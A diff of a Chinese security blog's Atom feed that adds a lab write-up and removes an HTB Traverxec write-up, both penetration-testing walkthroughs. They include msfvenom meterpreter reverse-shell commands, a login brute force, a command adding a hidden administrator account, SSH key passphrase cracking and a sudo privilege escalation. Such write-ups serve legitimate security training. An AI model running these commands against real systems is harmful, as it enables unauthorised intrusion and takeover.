@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://prontosil.com/"/>
-  <updated>2020-03-10T08:03:55.080Z</updated>
+  <updated>2020-03-10T09:52:23.711Z</updated>
   <id>http://prontosil.com/</id>
   
   <author>
@@ -17,11 +17,40 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>漏洞挖掘实验</title>
+    <link href="http://prontosil.com/posts/12fff649/"/>
+    <id>http://prontosil.com/posts/12fff649/</id>
+    <published>2020-03-10T08:57:06.000Z</published>
+    <updated>2020-03-10T09:52:23.711Z</updated>
+    
+    <content type="html"><![CDATA[<p>实验拓扑如下</p><p><img src="/posts/12fff649/1583830717716.png" alt></p><p><img src="/posts/12fff649/1583830733667.png" alt></p><h2 id="任务一-寻找漏洞主机"><a href="#任务一-寻找漏洞主机" class="headerlink" title="任务一 寻找漏洞主机"></a>任务一 寻找漏洞主机</h2><p>扫描存活主机(虽然知道了但还是扫一下)</p><p>注意本机ip是192.168.1.2</p><p><img src="/posts/12fff649/1583830890209.png" alt></p><p>-F 选项快速扫描一下其他主机</p><p><img src="/posts/12fff649/1583830929741.png" alt></p><p><img src="/posts/12fff649/1583830945755.png" alt></p><p>既然是ftp，那么就锁定192.168.1.3</p><p>提示了搜索vsftpd (靶机上搜索太慢了，我在自己机器上搜索的)</p><p><img src="/posts/12fff649/1583831162349.png" alt></p><p>然后使用这个exploit去打就行了</p><p><img src="/posts/12fff649/1583831194224.png" alt></p><p>可以看到进去就是root权限hhhh</p><p>然后还要搜索 1.key 这个文件</p><pre><code>find  / -name 1.key</code></pre><p><img src="/posts/12fff649/1583831225885.png" alt></p><p>读一下就好了</p><h2 id="任务二-使用nikto、crunch和burpsuite进行网站渗透和控制"><a href="#任务二-使用nikto、crunch和burpsuite进行网站渗透和控制" class="headerlink" title="任务二 使用nikto、crunch和burpsuite进行网站渗透和控制"></a>任务二 使用nikto、crunch和burpsuite进行网站渗透和控制</h2><p>此时的目标转向了 192.168.1.4 (192.168.1.3都拿到root了)</p><p>打开网站是 Cms made Simple 简称cms cms</p><p><img src="/posts/12fff649/1583831499729.png" alt></p><p>后台地址 <code>/admin/login.php</code></p><p>先设置一个代理</p><p><img src="/posts/12fff649/1583832214527.png" alt></p><p>然后抓个包</p><p><img src="/posts/12fff649/1583832242295.png" alt></p><p>由于密码是 <code>admin</code> 加上三位数字，如果想用 crunch 生成也行，直接用burp也行</p><p>爆破成功</p><p><img src="/posts/12fff649/1583832729565.png" alt></p><p>进入到网站后台</p><p><img src="/posts/12fff649/1583832774511.png" alt></p><h2 id="任务三-获取webshell权限并拿到目标及开放的远程桌面端口号"><a href="#任务三-获取webshell权限并拿到目标及开放的远程桌面端口号" class="headerlink" title="任务三 获取webshell权限并拿到目标及开放的远程桌面端口号"></a>任务三 获取webshell权限并拿到目标及开放的远程桌面端口号</h2><p>漏洞点在这</p><p><img src="/posts/12fff649/1583833127686.png" alt></p><p>Run一下</p><p><img src="/posts/12fff649/1583833240668.png" alt></p><p>好那我们这里为了避免网页卡顿。用msf生成一个shell.php</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f raw -o shell.txt</code></pre><p>然后复制到框框里运行一下</p><p>同时msf进行监听</p><p><img src="/posts/12fff649/1583833748737.png" alt></p><p>成功弹到shell。之后再使用msf生成shell.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -o shell.exe</code></pre><p>上传，重新弹一个shell</p><p><img src="/posts/12fff649/1583833790609.png" alt></p><p>ok这时候就能获得真正的meterpreter了</p><p>查看一下监听端口</p><p><img src="/posts/12fff649/1583833821793.png" alt></p><p>随便猜一个吧2333</p><h2 id="任务四-向目标主机添加用户并控制"><a href="#任务四-向目标主机添加用户并控制" class="headerlink" title="任务四 向目标主机添加用户并控制"></a>任务四 向目标主机添加用户并控制</h2><p>这个步骤和上一个实验比较相似，就不用细说了</p><pre><code>net user hacker Beijing123 /addnet localgroup administrators hacker /add</code></pre><p>远程登陆之后，给文件添加一个用户即可</p><p>最后</p><p><img src="/posts/12fff649/1583833940934.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;实验拓扑如下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/posts/12fff649/1583830717716.png&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/posts/12fff649/1583830733667.png&quot; alt&gt;&lt;/p&gt;
+&lt;h2 id=&quot;任务一-
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
+    
+  </entry>
+  
+  <entry>
     <title>企业环境渗透2</title>
     <link href="http://prontosil.com/posts/c08799e1/"/>
     <id>http://prontosil.com/posts/c08799e1/</id>
     <published>2020-03-10T07:47:54.000Z</published>
-    <updated>2020-03-10T08:03:55.080Z</updated>
+    <updated>2020-03-10T08:37:26.299Z</updated>
     
     <content type="html"><![CDATA[<h2 id="任务一-weblogic反序列化"><a href="#任务一-weblogic反序列化" class="headerlink" title="任务一 weblogic反序列化"></a>任务一 weblogic反序列化</h2><p>weblogic介绍</p><p>浏览器访问192.168.2.10:7001 然后就404</p><p><img src="/posts/c08799e1/1583826737126.png" alt></p><p>使用工具包中的webloigc利用工具</p><p><img src="/posts/c08799e1/1583826784567.png" alt></p><p>看到flag了是不是，然后执行 <code>cat /home/flag</code> 是吧233333</p><p>其实，这个flag不过就是个目录。。</p><p><img src="/posts/c08799e1/1583826861077.png" alt></p><p>得到flag</p><p><img src="/posts/c08799e1/1583826902355.png" alt="1583826902355"></p><h2 id="任务二-Wrodpress-任意文件读取"><a href="#任务二-Wrodpress-任意文件读取" class="headerlink" title="任务二 Wrodpress 任意文件读取"></a>任务二 Wrodpress 任意文件读取</h2><p>wpscan常规扫描一下</p><p><img src="/posts/c08799e1/1583826949884.png" alt></p><p>存在一个任意文件读取漏洞(不能复制粘贴好难受)</p><p><img src="/posts/c08799e1/1583826994083.png" alt></p><h2 id="任务三-Wordpress命令执行"><a href="#任务三-Wordpress命令执行" class="headerlink" title="任务三 Wordpress命令执行"></a>任务三 Wordpress命令执行</h2><h2 id="任务四-改进漏洞利用脚本获得命令执行权限"><a href="#任务四-改进漏洞利用脚本获得命令执行权限" class="headerlink" title="任务四 改进漏洞利用脚本获得命令执行权限"></a>任务四 改进漏洞利用脚本获得命令执行权限</h2>]]></content>
     
@@ -475,35 +504,6 @@
       
         &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;22端口，80端口，443端口&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/posts/73230382/1582967083509
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="HTB" scheme="http://prontosil.com/tags/HTB/"/>
-    
-      <category term="靶机" scheme="http://prontosil.com/tags/%E9%9D%B6%E6%9C%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HTB Traverxec靶机实战</title>
-    <link href="http://prontosil.com/posts/d5bfc2a3/"/>
-    <id>http://prontosil.com/posts/d5bfc2a3/</id>
-    <published>2020-02-29T08:55:13.000Z</published>
-    <updated>2020-02-29T09:16:50.196Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22号端口和80号端口</p><p><img src="/posts/d5bfc2a3/1582966595850.png" alt></p><p>看到http的信息是 <code>nostromo</code>,msf搜索exploit直接打</p><p><img src="/posts/d5bfc2a3/1582966633536.png" alt="成功得到meterpreter"></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>由于是 <code>nostromo</code> 搭建的，根目录 在 <code>/var/nostromo</code> </p><p><img src="/posts/d5bfc2a3/1582966671887.png" alt></p><p>查找conf目录</p><p><img src="/posts/d5bfc2a3/1582966693102.png" alt></p><p>查看配置文件 <code>nhttpd.conf</code></p><p><img src="/posts/d5bfc2a3/1582966726837.png" alt></p><p>发现根目录是在 public_www 下<br>是在家目录下，这个权限配置很有意思，你只能进去却看不到</p><p><img src="/posts/d5bfc2a3/1582966745190.png" alt></p><p>下载压缩包下来 <code>/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</code></p><p>解压之后就得到了私钥，但是尝试登陆还是需要密码</p><p><img src="/posts/d5bfc2a3/1582966789646.png" alt></p><p>这里就需要爆破了</p><p>可以使用john，首先需要 <code>python ssh2john.py id_rsa &gt; rsacrack</code> 转一下。但是这种方式太慢了，换一种，折耳根payload记一下</p><pre><code>cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;david@10.10.10.165&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</code></pre><p><img src="/posts/d5bfc2a3/1582966833790.png" alt></p><p>然后登陆 密码是 hunter</p><p><img src="/posts/d5bfc2a3/1582966848699.png" alt></p><pre><code>david@traverxec:~$ cat user.txt7db0b48469606a42cec20750d9782f3d</code></pre><p>得到flag</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看到一个文件</p><pre><code class="bash">david@traverxec:~/bin$ cat server-stats.head                                                                                                                     .----.                                                                     .---------. | == |          Webserver Statistics and Data                              |.-&quot;&quot;&quot;&quot;&quot;-.| |----|                Collection Script                                    ||       || | == |                 (c) David, 2019                                     ||       || |----|                                                                     |&#39;-.....-&#39;| |::::|                                                                     &#39;&quot;&quot;)---(&quot;&quot;&#39; |___.|                                                                    /:::::::::::\&quot;    &quot;                                                                   /:::=======:::\                                                                    jgs &#39;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#39;            david@traverxec:~/bin$ cat server-stats.sh                                             #!/bin/bash                                                                            cat /home/david/bin/server-stats.head                                                  echo &quot;Load: `/usr/bin/uptime`&quot;                                                         echo &quot; &quot;                                                                               echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;               echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;    echo &quot; &quot;                                                                               echo &quot;Last 5 journal log lines:&quot;                                                       /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat                </code></pre><p>发现 <code>journalctl</code> 是用sudo执行的</p><p>提权： <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p><pre><code># cat root.txt9aa36a6d76f785dfd320a478f6e0d906</code></pre><p><img src="/posts/d5bfc2a3/1582966978146.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体下来感觉还行，还是要扩大知识面</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;22号端口和80号端口&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/posts/d5bfc2a3/1582966595850.png
       
     
     </summary>
